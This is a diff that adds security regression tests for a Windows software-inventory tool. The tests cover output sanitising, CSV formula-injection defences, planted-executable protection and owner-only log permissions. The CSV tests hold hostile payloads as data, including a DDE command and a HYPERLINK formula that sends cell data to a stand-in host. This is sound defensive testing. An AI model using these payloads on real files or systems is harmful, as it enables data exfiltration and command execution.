@@ -13,7 +13,10 @@ Tests to verify security fixes are working correctly:
 
 import csv
 import io
+import logging
+import msvcrt
 import os
+import stat
 import sys
 import tempfile
 import unittest
@@ -49,16 +52,57 @@ class TestOutputSanitization(unittest.TestCase):
         self.assertEqual(result, "Real Text")
 
     def test_removes_control_characters(self):
-        """Control characters (except newline/tab) should be stripped."""
+        """Non-line-break control characters should be stripped."""
         malicious = "Normal\x00\x01\x02\x03Text"
         result = se.sanitize_output(malicious)
         self.assertEqual(result, "NormalText")
 
-    def test_preserves_newlines_and_tabs(self):
-        """Newlines and tabs should be preserved."""
+    def test_line_breaks_and_tabs_become_spaces(self):
+        """Newlines and tabs are replaced with spaces (output fields are single-line)."""
         text = "Line1\nLine2\tTabbed"
         result = se.sanitize_output(text)
-        self.assertEqual(result, "Line1\nLine2\tTabbed")
+        self.assertEqual(result, "Line1 Line2 Tabbed")
+
+    def test_carriage_return_cannot_hide_text(self):
+        """A CR must not let a name overwrite itself on screen."""
+        result = se.sanitize_output("EvilRAT\rGoogle Chrome")
+        self.assertNotIn("\r", result)
+        self.assertEqual(result, "EvilRAT Google Chrome")
+
+    def test_newline_cannot_inject_table_row(self):
+        """A newline must not let a name inject a fake row into table output."""
+        result = se.sanitize_output("EvilRAT\nGoogle Chrome | 131.0 | Google LLC")
+        self.assertNotIn("\n", result)
+
+    def test_all_vertical_whitespace_becomes_space(self):
+        """VT, FF, NEL and Unicode line/paragraph separators become spaces."""
+        for ch in ["\v", "\f", "\x85", " ", " "]:
+            self.assertEqual(se.sanitize_output(f"a{ch}b"), "a b", f"U+{ord(ch):04X}")
+
+    def test_removes_c1_control_characters(self):
+        """C1 controls (0x80-0x9F) are removed, including 8-bit CSI sequences."""
+        self.assertEqual(se.sanitize_output("x\x9b31my"), "xy")   # 8-bit CSI + params
+        self.assertEqual(se.sanitize_output("a\x90b\x9fc"), "abc")
+
+    def test_csi_private_parameters_leave_no_residue(self):
+        """Sequences like ESC[?25l (hide cursor) are fully removed, not left as '[?25l'."""
+        self.assertEqual(se.sanitize_output("A\x1b[?25lB"), "AB")
+        self.assertEqual(se.sanitize_output("A\x1b[>4;1mB"), "AB")
+
+    def test_removes_osc_terminated_by_st(self):
+        """OSC sequences terminated by ST (ESC \\) are removed, not only BEL-terminated ones."""
+        self.assertEqual(se.sanitize_output("A\x1b]0;Fake Title\x1b\\B"), "AB")
+
+    def test_removes_two_byte_escape_sequences(self):
+        """Two-byte escapes (ESC c reset, ESC 7 save cursor, ESC ( B charset) are removed whole,
+        matching how a terminal would consume them."""
+        self.assertEqual(se.sanitize_output("A\x1bcB"), "AB")
+        self.assertEqual(se.sanitize_output("A\x1b7B"), "AB")
+        self.assertEqual(se.sanitize_output("A\x1b(BC"), "AC")
+
+    def test_non_string_input_is_stringified(self):
+        """Non-string values (e.g. a REG_DWORD read from the registry) don't crash."""
+        self.assertEqual(se.sanitize_output(20240101), "20240101")
 
     def test_handles_empty_string(self):
         """Empty strings should be handled gracefully."""
@@ -1101,6 +1145,742 @@ class TestCsvSanitizationConsistency(unittest.TestCase):
                              f"Mismatch in field '{field}': CSV={csv_entry[field]!r}, JSON={json_entry[field]!r}")
 
 
+class TestDiffExportSanitization(unittest.TestCase):
+    """Baseline diff output (table, JSON, CSV) must sanitize every field.
+
+    Removed entries and metadata come from a baseline file on disk, so they are untrusted.
+    """
+
+    EVIL = "Evil\rTrusted\x1b[2K‮"
+
+    def _diff(self):
+        evil = se.SoftwareInfo(name=self.EVIL, version="1.0\x1b[31m", publisher="Pub\nX",
+                               install_date="2025\x07", source="Registry\x9b2J")
+        good = se.SoftwareInfo(name="Good", version="2.0", publisher="P", source="Registry")
+        good_new = se.SoftwareInfo(name="Good", version="2.1\r", publisher="P", source="Registry")
+        return se.BaselineDiff(added=[evil], removed=[evil], changed=[(good, good_new)])
+
+    def _assert_clean(self, text):
+        for bad in ["\x1b", "\r", "‮", "\x07", "\x9b"]:
+            self.assertNotIn(bad, text, f"found {bad!r}")
+
+    def test_diff_csv_sanitizes_all_fields(self):
+        out = se.BaselineManager.diff_to_csv(self._diff())
+        rows = list(csv.reader(io.StringIO(out)))
+        self.assertEqual(rows[0], ["change_type", "name", "baseline_version",
+                                   "current_version", "publisher", "source"])
+        self.assertEqual(len(rows), 4)
+        for row in rows[1:]:
+            for cell in row:
+                self._assert_clean(cell)
+                self.assertNotIn("\n", cell)
+        self.assertEqual(rows[1][1], "Evil Trusted")
+
+    def test_diff_json_sanitizes_all_fields_and_metadata(self):
+        meta = {"created_at": "2026\x1b]0;x\x07", "hostname": "HOST\rFAKE"}
+        data = json.loads(se.BaselineManager.diff_to_json(self._diff(), meta, "base.json"))
+        self.assertEqual(data["summary"]["total_changes"], 3)
+        self.assertEqual(data["metadata"]["baseline_hostname"], "HOST FAKE")
+        self.assertEqual(data["metadata"]["baseline_created"], "2026")
+        for entry in data["added"] + data["removed"]:
+            for value in entry.values():
+                self._assert_clean(value)
+                self.assertNotIn("\n", value)
+        self.assertEqual(data["changed"][0]["current"]["version"], "2.1 ")
+
+    def test_display_diff_sanitizes_metadata(self):
+        meta = {"created_at": "2026\x1b[2J", "hostname": "HOST\rFAKE", "software_count": 0}
+        buf = io.StringIO()
+        with patch("sys.stdout", buf):
+            se.BaselineManager.display_diff(self._diff(), meta)
+        out = buf.getvalue()
+        self._assert_clean(out)
+        self.assertIn("Baseline host: HOST FAKE", out)
+        self.assertIn("Baseline software count: 0", out)  # 0 is a real value, not "unknown"
+
+
+class TestCsvFormulaInjection(unittest.TestCase):
+    """CSV exports must not carry cells that spreadsheet apps run as formulas."""
+
+    PAYLOADS = [
+        '=HYPERLINK("http://x.invalid/?"&A1,"Click")',
+        "=cmd|' /C calc'!A0",          # DDE
+        "+1+cmd|' /C calc'!A0",
+        "-2+3",
+        "@SUM(A1:A9)",
+        "\t=1+1",                       # TAB becomes a space during sanitizing
+        "\r=1+1",                       # so does CR
+        "  =1+1",                       # leading whitespace is ignored by the check
+    ]
+
+    def _rows(self, csv_text):
+        return list(csv.DictReader(io.StringIO(csv_text)))
+
+    def test_csv_safe_cell_neutralises_each_prefix(self):
+        for payload in self.PAYLOADS:
+            cell = se.csv_safe_cell(payload)
+            self.assertTrue(cell.startswith("'"), f"not neutralised: {payload!r} -> {cell!r}")
+            self.assertEqual(cell[1:], se.sanitize_output(payload))
+
+    def test_ordinary_values_unchanged(self):
+        for value in ["Google Chrome", "A, B & C", 'App "Pro"', "a=b", "1.2.3",
+                      "C:\\Program Files\\App", "", "Notepad++"]:
+            self.assertEqual(se.csv_safe_cell(value), value)
+
+    def test_none_becomes_empty_cell(self):
+        self.assertEqual(se.csv_safe_cell(None), "")
+
+    def test_to_csv_guards_every_field(self):
+        sw = se.SoftwareInfo(name="=1+1", version="-1", publisher="@evil", install_date="+2",
+                             source="=src", install_location="=C:\\x")
+        row = self._rows(se.SoftwareExporter.to_csv([sw]))[0]
+        for field, value in row.items():
+            self.assertTrue(value.startswith("'"), f"{field} not neutralised: {value!r}")
+
+    def test_to_csv_round_trip_keeps_value_readable(self):
+        payload = '=HYPERLINK("http://x.invalid/?"&A1,"Click")'
+        row = self._rows(se.SoftwareExporter.to_csv([se.SoftwareInfo(name=payload)]))[0]
+        self.assertEqual(row["name"], "'" + payload)
+
+    def test_diff_csv_guards_every_field(self):
+        evil = se.SoftwareInfo(name="=1+1", version="+1", publisher="@p", source="-s")
+        old = se.SoftwareInfo(name="=App", version="=1", publisher="@p", source="-s")
+        new = se.SoftwareInfo(name="=App", version="=2", publisher="@p", source="-s")
+        diff = se.BaselineDiff(added=[evil], removed=[evil], changed=[(old, new)])
+        rows = list(csv.reader(io.StringIO(se.BaselineManager.diff_to_csv(diff))))
+        for row in rows[1:]:
+            for cell in row[1:]:                       # row[0] is our own change_type label
+                if cell:
+                    self.assertTrue(cell.startswith("'"), f"not neutralised: {cell!r}")
+
+
+class _FakeRegistry:
+    """Minimal winreg stand-in: {subkey_name: {value_name: value}} under a single path.
+
+    A value that is an Exception instance is raised when read.
+    """
+
+    FUNCS = ("OpenKey", "QueryInfoKey", "EnumKey", "QueryValueEx", "CloseKey")
+
+    def __init__(self, entries):
+        self.entries = entries
+        self.names = list(entries)
+
+    def OpenKey(self, hive, path, *args):
+        return path                                   # a "key" is just its path
+
+    def QueryInfoKey(self, key):
+        return (len(self.names), 0, 0)
+
+    def EnumKey(self, key, i):
+        return self.names[i]
+
+    def QueryValueEx(self, key, value_name):
+        values = self.entries[key.rsplit("\\", 1)[-1]]
+        if value_name not in values:
+            raise FileNotFoundError(value_name)
+        value = values[value_name]
+        if isinstance(value, Exception):
+            raise value
+        return value, 0
+
+    def CloseKey(self, key):
+        pass
+
+    def scan(self, scanner=None):
+        """Run RegistryScanner.scan_registry_key against this fake; returns (scanner, results)."""
+        import contextlib
+        scanner = scanner or se.RegistryScanner()
+        with contextlib.ExitStack() as stack:
+            for name in self.FUNCS:
+                stack.enter_context(patch.object(se.winreg, name, getattr(self, name)))
+            results = scanner.scan_registry_key(se.winreg.HKEY_CURRENT_USER, r"SOFTWARE\Uninstall")
+        return scanner, results
+
+    def scan_all(self):
+        """Run get_all_registry_software with a single registry path pointing at this fake."""
+        import contextlib
+        scanner = se.RegistryScanner()
+        with contextlib.ExitStack() as stack:
+            for name in self.FUNCS:
+                stack.enter_context(patch.object(se.winreg, name, getattr(self, name)))
+            stack.enter_context(patch.object(se.RegistryScanner, "REGISTRY_PATHS",
+                                             [(se.winreg.HKEY_CURRENT_USER, r"SOFTWARE\Uninstall")]))
+            results = scanner.get_all_registry_software()
+        return scanner, results
+
+
+class TestRegistryMalformedValues(unittest.TestCase):
+    """A malformed registry value must not hide software or abort the scan.
+
+    Any process can write under HKCU, so a REG_DWORD InstallDate used to make the whole
+    registry source return nothing.
+    """
+
+    GOOD = {"DisplayName": "Good App", "DisplayVersion": "2.0", "Publisher": "Good Inc"}
+
+    def _by_name(self, results):
+        return {s.name: s for s in results}
+
+    def test_dword_install_date_is_converted_not_fatal(self):
+        reg = _FakeRegistry({"evil": {"DisplayName": "Evil", "InstallDate": 20240101},
+                             "good": self.GOOD})
+        scanner, results = reg.scan()
+        found = self._by_name(results)
+        self.assertEqual(set(found), {"Evil", "Good App"})
+        self.assertEqual(found["Evil"].install_date, "2024-01-01")
+        self.assertEqual(scanner.converted_values, 1)
+
+    def test_dword_display_version_becomes_text(self):
+        _, results = _FakeRegistry({"a": {"DisplayName": "App", "DisplayVersion": 123}}).scan()
+        self.assertEqual(results[0].version, "123")
+
+    def test_binary_display_name_is_decoded(self):
+        raw = "Evil App".encode("utf-16-le") + b"\x00\x00"
+        _, results = _FakeRegistry({"a": {"DisplayName": raw}}).scan()
+        self.assertEqual(results[0].name, "Evil App")
+
+    def test_multi_sz_is_joined(self):
+        _, results = _FakeRegistry({"a": {"DisplayName": "App", "Publisher": ["Part A", "Part B"]}}).scan()
+        self.assertEqual(results[0].publisher, "Part A Part B")
+
+    def test_all_fields_are_strings(self):
+        _, results = _FakeRegistry({"a": {"DisplayName": 7, "DisplayVersion": 1, "Publisher": b"",
+                                          "InstallDate": [], "InstallLocation": 0}}).scan()
+        for field in ("name", "version", "publisher", "install_date", "install_location"):
+            self.assertIsInstance(getattr(results[0], field), str, field)
+
+    def test_system_component_int_or_string_is_skipped(self):
+        reg = _FakeRegistry({"int": {"DisplayName": "Hidden1", "SystemComponent": 1},
+                             "str": {"DisplayName": "Hidden2", "SystemComponent": "1"},
+                             "zero": {"DisplayName": "Shown", "SystemComponent": 0}})
+        scanner, results = reg.scan()
+        self.assertEqual([s.name for s in results], ["Shown"])
+        self.assertEqual(scanner.converted_values, 0)   # DWORD is the normal type for this flag
+
+    def test_unparseable_entry_skipped_others_kept(self):
+        reg = _FakeRegistry({"bad": {"DisplayName": TypeError("boom")}, "good": self.GOOD})
+        scanner, results = reg.scan()
+        self.assertEqual([s.name for s in results], ["Good App"])
+        self.assertEqual(scanner.unreadable_entries, 1)
+
+    def test_scan_warns_once_on_anomalies(self):
+        reg = _FakeRegistry({"a": {"DisplayName": "A", "InstallDate": 20240101},
+                             "b": {"DisplayName": "B", "DisplayVersion": 5}})
+        with self.assertLogs(se.logger, level="WARNING") as logs:
+            _, results = reg.scan_all()
+        self.assertEqual(len(results), 2)
+        self.assertEqual(len(logs.records), 1)
+        self.assertIn("2 registry value(s)", logs.output[0])
+
+    def test_normal_registry_produces_no_warning(self):
+        with self.assertNoLogs(se.logger, level="WARNING"):
+            _, results = _FakeRegistry({"good": self.GOOD}).scan_all()
+        self.assertEqual(len(results), 1)
+
+
+class TestBrowserMalformedInput(unittest.TestCase):
+    """Malformed browser files must not crash the extension scan."""
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.dir = Path(self.tmp.name)
+        self.scanner = se.BrowserExtensionScanner()
+
+    def tearDown(self):
+        self.tmp.cleanup()
+
+    def _manifest(self, content, ext_dir=None):
+        ext_dir = ext_dir or self.dir
+        ext_dir.mkdir(parents=True, exist_ok=True)
+        path = ext_dir / "manifest.json"
+        if isinstance(content, (bytes, str)):
+            path.write_bytes(content if isinstance(content, bytes) else content.encode("utf-8"))
+        else:
+            path.write_text(json.dumps(content), encoding="utf-8")
+        return path
+
+    def _firefox(self, data):
+        path = self.dir / "extensions.json"
+        path.write_text(data if isinstance(data, str) else json.dumps(data), encoding="utf-8")
+        return self.scanner._parse_firefox_extensions_json(path)
+
+    # --- Chromium ---------------------------------------------------------------
+
+    def test_chromium_non_string_name_is_converted(self):
+        ext = self.scanner._parse_chromium_manifest(self._manifest({"name": 123, "version": 2}), "id", "Chrome")
+        self.assertEqual((ext.name, ext.version), ("123", "2"))
+
+    def test_chromium_bad_content_scripts_entries_are_ignored(self):
+        path = self._manifest({"name": "X", "content_scripts": ["oops", {"matches": ["<all_urls>"]}, {"matches": 5}]})
+        ext = self.scanner._parse_chromium_manifest(path, "id", "Chrome")
+        self.assertEqual(ext.permissions, ["<all_urls>"])
+        self.assertTrue(ext.has_sensitive_permissions())
+
+    def test_chromium_permission_list_items_are_strings(self):
+        path = self._manifest({"name": "X", "permissions": [{"fileSystem": ["write"]}, 5, None, "tabs"],
+                               "host_permissions": "not-a-list"})
+        ext = self.scanner._parse_chromium_manifest(path, "id", "Chrome")
+        self.assertEqual(ext.permissions, ["fileSystem", "5", "tabs"])
+        ext.has_sensitive_permissions()   # must not raise
+
+    def test_chromium_non_object_manifest_returns_none(self):
+        self.assertIsNone(self.scanner._parse_chromium_manifest(self._manifest([1, 2]), "id", "Chrome"))
+
+    def test_chromium_deeply_nested_manifest_returns_none(self):
+        path = self._manifest("[" * 100000 + "]" * 100000)
+        self.assertIsNone(self.scanner._parse_chromium_manifest(path, "id", "Chrome"))
+
+    def test_localized_name_with_invalid_utf8_falls_back(self):
+        path = self._manifest({"name": "__MSG_appName__"})
+        loc = self.dir / "_locales" / "en"
+        loc.mkdir(parents=True)
+        (loc / "messages.json").write_bytes(b'{"appName": {"message": "\xff\xfe"}}')
+        ext = self.scanner._parse_chromium_manifest(path, "id", "Chrome")
+        self.assertEqual(ext.name, "__MSG_appName__")
+
+    def test_localized_name_with_wrong_types_falls_back(self):
+        path = self._manifest({"name": "__MSG_appName__"})
+        for locale, content in [("en", ["list"]), ("en_US", {"appName": "just a string"}),
+                                ("en_GB", {"appName": {"message": 5}})]:
+            loc = self.dir / "_locales" / locale
+            loc.mkdir(parents=True)
+            (loc / "messages.json").write_text(json.dumps(content), encoding="utf-8")
+        ext = self.scanner._parse_chromium_manifest(path, "id", "Chrome")
+        self.assertEqual(ext.name, "__MSG_appName__")
+
+    def test_chromium_dir_scan_keeps_good_extensions(self):
+        self._manifest({"name": 999}, self.dir / "Extensions" / "badext" / "1.0_0")
+        self._manifest({"name": "Good"}, self.dir / "Extensions" / "goodext" / "1.0_0")
+        found = self.scanner._scan_chromium_extensions_dir(self.dir / "Extensions", "Chrome")
+        self.assertEqual(sorted(e.name for e in found), ["999", "Good"])
+
+    # --- Firefox ----------------------------------------------------------------
+
+    def test_firefox_null_user_permissions(self):
+        exts = self._firefox({"addons": [{"type": "extension", "id": "a@b",
+                                          "defaultLocale": {"name": "A"}, "userPermissions": None}]})
+        self.assertEqual([(e.name, e.permissions) for e in exts], [("A", [])])
+
+    def test_firefox_null_default_locale_falls_back_to_id(self):
+        exts = self._firefox({"addons": [{"type": "extension", "id": "a@b", "defaultLocale": None}]})
+        self.assertEqual(exts[0].name, "a@b")
+
+    def test_firefox_bad_entry_does_not_drop_others(self):
+        exts = self._firefox({"addons": ["not-an-object", 42,
+                                         {"type": "extension", "id": "good@x", "active": "yes",
+                                          "defaultLocale": {"name": "Good"}}]})
+        self.assertEqual([e.name for e in exts], ["Good"])
+        self.assertTrue(exts[0].enabled)
+
+    def test_firefox_wrong_top_level_shapes(self):
+        self.assertEqual(self._firefox([1, 2]), [])
+        self.assertEqual(self._firefox({"addons": "nope"}), [])
+        self.assertEqual(self._firefox("[" * 100000 + "]" * 100000), [])
+
+
+class TestExecutableResolution(unittest.TestCase):
+    """External programs are launched by absolute path, never by bare name."""
+
+    def _ok_result(self, stdout=""):
+        result = MagicMock()
+        result.stdout, result.returncode = stdout, 0
+        return result
+
+    def test_system_dir_comes_from_os_not_environment(self):
+        real = se._system_dir()
+        with patch.dict(os.environ, {"SystemRoot": r"C:\Planted", "windir": r"C:\Planted"}):
+            self.assertEqual(se._system_dir(), real)
+        self.assertTrue((real / "kernel32.dll").is_file())
+
+    def test_powershell_path_is_absolute_in_system_dir(self):
+        ps = se._powershell_path()
+        self.assertTrue(ps.is_absolute())
+        self.assertEqual(ps.parent.parent.parent, se._system_dir())
+        self.assertEqual(ps.name.lower(), "powershell.exe")
+
+    def test_store_scanner_runs_absolute_powershell(self):
+        with patch("subprocess.run", return_value=self._ok_result('"Name"\n')) as run:
+            se.StoreAppScanner().get_store_apps()
+        cmd = run.call_args[0][0]
+        self.assertEqual(cmd[0], str(se._powershell_path()))
+
+    def test_winget_path_comes_from_localappdata(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            alias = Path(tmp) / "Microsoft" / "WindowsApps" / "winget.exe"
+            alias.parent.mkdir(parents=True)
+            alias.write_bytes(b"")
+            with patch.dict(os.environ, {"LOCALAPPDATA": tmp}):
+                self.assertEqual(se._winget_path(), alias)
+
+    def test_winget_runs_absolute_path(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            fake = Path(tmp) / "winget.exe"
+            fake.write_bytes(b"")
+            with patch.object(se, "_winget_path", return_value=fake), \
+                 patch("subprocess.run", return_value=self._ok_result()) as run:
+                se.WingetUpdateChecker().check_for_updates()
+        self.assertEqual(run.call_args[0][0][0], str(fake))
+
+    def test_missing_winget_never_falls_back_to_bare_name(self):
+        captured = io.StringIO()
+        with patch.object(se, "_winget_path", return_value=None), \
+             patch("subprocess.run") as run, patch("sys.stderr", captured):
+            self.assertEqual(se.WingetUpdateChecker().check_for_updates(), [])
+        run.assert_not_called()
+        self.assertIn("winget not found", captured.getvalue())
+
+    def test_harden_environment_sets_flag_without_overriding(self):
+        with patch.dict(os.environ, {}, clear=False):
+            os.environ.pop("NoDefaultCurrentDirectoryInExePath", None)
+            se._harden_process_environment()
+            self.assertEqual(os.environ["NoDefaultCurrentDirectoryInExePath"], "1")
+            os.environ["NoDefaultCurrentDirectoryInExePath"] = "keep"
+            se._harden_process_environment()
+            self.assertEqual(os.environ["NoDefaultCurrentDirectoryInExePath"], "keep")
+
+    def test_main_hardens_environment_first(self):
+        with patch.object(se, "_harden_process_environment") as harden, \
+             patch.object(se, "WingetUpdateChecker") as checker, \
+             patch.object(sys, "argv", ["Software_Enumerator.py", "--check-updates", "--quiet"]), \
+             patch.object(se, "setup_logging"), patch.object(se, "_load_env_file"):
+            checker.return_value.check_for_updates.return_value = []
+            se.main()
+        harden.assert_called_once()
+
+    def test_planted_powershell_in_cwd_is_not_run(self):
+        """Integration: a copy of hostname.exe named powershell.exe in the CWD, with CWD search
+        enabled, must not be what the tool runs. Self-checking: skipped if planting can't work here."""
+        import shutil
+        hostname_exe = se._system_dir() / "hostname.exe"
+        if not hostname_exe.is_file():
+            self.skipTest("hostname.exe not available")
+        repo_dir = str(Path(se.__file__).resolve().parent)
+        probe = (
+            "import subprocess, sys\n"
+            f"sys.path.insert(0, {repo_dir!r})\n"
+            "import Software_Enumerator as se\n"
+            "args = ['-NoProfile', '-Command', 'echo REAL']\n"
+            "bare = subprocess.run(['powershell'] + args, capture_output=True, text=True).stdout.strip()\n"
+            "fixed = subprocess.run([str(se._powershell_path())] + args, capture_output=True, text=True).stdout.strip()\n"
+            "print(repr(bare)); print(repr(fixed))\n"
+        )
+        env = {k: v for k, v in os.environ.items() if k.lower() != "nodefaultcurrentdirectoryinexepath"}
+        with tempfile.TemporaryDirectory() as tmp:
+            shutil.copy(hostname_exe, Path(tmp) / "powershell.exe")
+            out = subprocess_run_text([sys.executable, "-c", probe], cwd=tmp, env=env)
+        import ast  # literal_eval, not eval: the output includes what a planted binary printed
+        bare, fixed = [ast.literal_eval(line) for line in out.splitlines()[-2:]]
+        if bare == "REAL":
+            self.skipTest("current-directory search is not active in this environment")
+        self.assertEqual(fixed, "REAL", "absolute path must run the real PowerShell")
+
+
+class TestLogFilePermissions(unittest.TestCase):
+    """Log files are really restricted to their owner (and SYSTEM) on Windows.
+
+    os.chmod(0o600) used to be the only protection, and on Windows it changes nothing.
+    """
+
+    OWNER_ONLY_ACES = {"(A;;FA;;;OW)", "(A;;FA;;;SY)"}
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.dir = Path(self.tmp.name)
+        self._saved_handlers = list(se.logger.handlers)
+
+    def tearDown(self):
+        for h in list(se.logger.handlers):
+            if h not in self._saved_handlers:
+                h.close()
+        se.logger.handlers = self._saved_handlers
+        self.tmp.cleanup()
+
+    @staticmethod
+    def _dacl(path):
+        """The file's DACL as SDDL, via icacls /save (UTF-16LE without BOM, not localized)."""
+        import re
+        import subprocess
+        out = Path(tempfile.mkdtemp()) / "acl.txt"
+        try:
+            subprocess.run([str(se._system_dir() / "icacls.exe"), str(path), "/save", str(out)],
+                           capture_output=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            dacl = out.read_text(encoding="utf-16-le").splitlines()[1]
+        finally:
+            out.unlink(missing_ok=True)
+            out.parent.rmdir()
+        return dacl, set(re.findall(r"\([^)]*\)", dacl))
+
+    def _assert_owner_only(self, path):
+        dacl, aces = self._dacl(path)
+        self.assertTrue(dacl.startswith("D:P"), f"DACL not protected from inheritance: {dacl}")
+        self.assertEqual(aces, self.OWNER_ONLY_ACES, f"unexpected entries: {dacl}")
+
+    def _flush(self):
+        for h in se.logger.handlers:
+            h.flush()
+
+    def test_setup_logging_creates_owner_only_file(self):
+        log = self.dir / "audit.log"
+        se.setup_logging(log_file=str(log))
+        se.log_audit_event("TEST", "hello")
+        self._flush()
+        self._assert_owner_only(log)
+        self.assertIn("hello", log.read_text(encoding="utf-8"))   # owner can still write and read
+
+    def test_existing_explicit_grant_is_removed(self):
+        import subprocess
+        log = self.dir / "audit.log"
+        log.write_text("old\n", encoding="utf-8")
+        subprocess.run([str(se._system_dir() / "icacls.exe"), str(log), "/grant", "*S-1-1-0:R"],  # Everyone:R
+                       capture_output=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        self.assertIn("(A;;FR;;;WD)", self._dacl(log)[1])
+        se.setup_logging(log_file=str(log))
+        self._assert_owner_only(log)
+
+    def test_rotated_files_are_owner_only(self):
+        log = self.dir / "rot.log"
+        handler = se._RestrictedRotatingFileHandler(log, maxBytes=200, backupCount=2, encoding="utf-8")
+        test_logger = logging.getLogger("test_rotation_acl")
+        test_logger.addHandler(handler)
+        try:
+            for i in range(30):
+                test_logger.warning("line %03d padding padding padding", i)
+        finally:
+            test_logger.removeHandler(handler)
+            handler.close()
+        for path in (log, Path(f"{log}.1"), Path(f"{log}.2")):
+            self.assertTrue(path.exists(), path)
+            self._assert_owner_only(path)
+
+    def test_setup_logging_uses_restricted_handler(self):
+        se.setup_logging(log_file=str(self.dir / "a.log"))
+        handlers = [h for h in se.logger.handlers if isinstance(h, se._RestrictedRotatingFileHandler)]
+        self.assertEqual(len(handlers), 1)
+
+    def test_failure_warns_once_and_logging_continues(self):
+        """A drive without access-list support (FAT32/exFAT): new files and every rollover
+        are unprotected, so warn once and keep logging."""
+        log = self.dir / "fail.log"
+        captured = io.StringIO()
+        with patch.object(se, "_volume_supports_acls", return_value=False), \
+             patch("sys.stderr", captured):
+            handler = se._RestrictedRotatingFileHandler(log, maxBytes=200, backupCount=2, encoding="utf-8")
+            test_logger = logging.getLogger("test_acl_failure")
+            test_logger.addHandler(handler)
+            try:
+                for i in range(30):                    # several rollovers, each calls _open()
+                    test_logger.warning("line %03d padding padding padding", i)
+            finally:
+                test_logger.removeHandler(handler)
+                handler.close()
+        self.assertEqual(captured.getvalue().count("could not restrict log file permissions"), 1)
+        self.assertIn("line 029", log.read_text(encoding="utf-8"))
+
+    def test_new_file_on_drive_without_acls_warns(self):
+        """FAT32/exFAT silently ignore the access list requested at creation, so a brand-new
+        log there must still produce the warning."""
+        captured = io.StringIO()
+        with patch.object(se, "_volume_supports_acls", return_value=False), patch("sys.stderr", captured):
+            se.setup_logging(log_file=str(self.dir / "fat.log"))
+        self.assertEqual(captured.getvalue().count("could not restrict log file permissions"), 1)
+
+    def test_restrict_handle_to_owner_raises_oserror_for_bad_handle(self):
+        with self.assertRaises(OSError):
+            se._restrict_handle_to_owner(0)
+
+    # --- Files that already exist (pre-created by someone else, or linked) ---------------
+
+    FOREIGN_SID = "S-1-5-21-1000000000-2000000000-3000000000-1001"
+
+    def test_new_file_is_restricted_at_creation(self):
+        """A new log gets the access list when it is created, not afterwards."""
+        log = self.dir / "new.log"
+        with patch.object(se, "_restrict_handle_to_owner") as after_open:
+            se.setup_logging(log_file=str(log))
+        after_open.assert_not_called()
+        self._assert_owner_only(log)
+
+    def test_open_log_handle_never_creates_over_existing_file(self):
+        log = self.dir / "exists.log"
+        log.write_text("someone else's\n", encoding="utf-8")
+        handle, created = se._open_log_handle(str(log))
+        se._win32().close_handle(handle)
+        self.assertFalse(created)
+        self.assertEqual(log.read_text(encoding="utf-8"), "someone else's\n")
+
+    def test_log_is_never_reopened_by_path(self):
+        """The stream must wrap the handle we created or checked, not a second open by name."""
+        log = self.dir / "audit.log"
+        with patch.object(logging.FileHandler, "_open", side_effect=AssertionError("reopened by path")):
+            se.setup_logging(log_file=str(log))
+            se.log_audit_event("TEST", "through the handle")
+            self._flush()
+        self.assertIn("through the handle", log.read_text(encoding="utf-8"))
+
+    def test_open_log_cannot_be_swapped_or_its_folder_renamed(self):
+        """While the log is open, nobody can replace/delete it or rename its folder, so it
+        can't be swapped (e.g. for a directory junction to someone else's folder)."""
+        logs = self.dir / "logs"
+        logs.mkdir()
+        log = logs / "audit.log"
+        se.setup_logging(log_file=str(log))
+        other = self.dir / "attacker.log"
+        other.write_text("attacker\n", encoding="utf-8")
+        for label, action in (("replace", lambda: os.replace(other, log)),
+                              ("delete", lambda: os.remove(log)),
+                              ("rename folder", lambda: os.rename(logs, self.dir / "moved"))):
+            with self.assertRaises(PermissionError, msg=label):
+                action()
+        se.log_audit_event("TEST", "still ours")
+        self._flush()
+        self.assertIn("still ours", log.read_text(encoding="utf-8"))
+
+    def test_reparse_point_is_refused(self):
+        """A symlink is opened as itself (not followed) and recognised by its reparse attribute.
+        Simulated, since creating a real symlink needs admin or Developer Mode."""
+        log = self.dir / "audit.log"
+        log.write_text("x\n", encoding="utf-8")
+        real_fstat = os.fstat
+
+        class _Stat:
+            def __init__(self, st):
+                self.st_nlink = st.st_nlink
+                self.st_file_attributes = st.st_file_attributes | stat.FILE_ATTRIBUTE_REPARSE_POINT
+
+        with patch.object(se.os, "fstat", lambda fd: _Stat(real_fstat(fd))):
+            with self.assertRaises(se.LogFileOwnershipError) as ctx:
+                se.setup_logging(log_file=str(log))
+        self.assertIn("reparse point", str(ctx.exception))
+
+    def test_access_denied_on_foreign_file_explains_ownership(self):
+        log = self.dir / "audit.log"
+        log.write_text("x\n", encoding="utf-8")
+        with patch.object(se, "_handle_owner_sid", return_value=self.FOREIGN_SID):
+            with self.assertRaises(se.LogFileOwnershipError):
+                se._raise_if_owned_by_another_account(str(log))
+        se._raise_if_owned_by_another_account(str(log))   # our own file: no exception
+
+    def test_file_owned_by_another_account_is_refused(self):
+        log = self.dir / "audit.log"
+        log.write_text("pre-created\n", encoding="utf-8")
+        dacl_before = self._dacl(log)[0]
+        with patch.object(se, "_handle_owner_sid", return_value=self.FOREIGN_SID):
+            with self.assertRaises(se.LogFileOwnershipError) as ctx:
+                se.setup_logging(log_file=str(log))
+        self.assertIn("owned by another account", str(ctx.exception))
+        self.assertEqual(log.read_text(encoding="utf-8"), "pre-created\n")   # nothing written
+        self.assertEqual(self._dacl(log)[0], dacl_before)                    # and not modified
+
+    def test_file_owned_by_system_or_administrators_is_accepted(self):
+        for sid in ("S-1-5-18", "S-1-5-32-544"):
+            log = self.dir / f"trusted-{sid}.log"
+            log.write_text("x\n", encoding="utf-8")
+            with patch.object(se, "_handle_owner_sid", return_value=sid):
+                se.setup_logging(log_file=str(log))                          # must not raise
+            self._assert_owner_only(log)
+            for h in list(se.logger.handlers):   # setup_logging() drops old handlers without closing them
+                h.close()
+            se.logger.handlers.clear()
+
+    def test_own_existing_file_is_accepted(self):
+        """Owner of a file this process creates is one of our own SIDs (real check, no mocks)."""
+        log = self.dir / "mine.log"
+        log.write_text("earlier run\n", encoding="utf-8")
+        se.setup_logging(log_file=str(log))
+        se.log_audit_event("TEST", "appended")
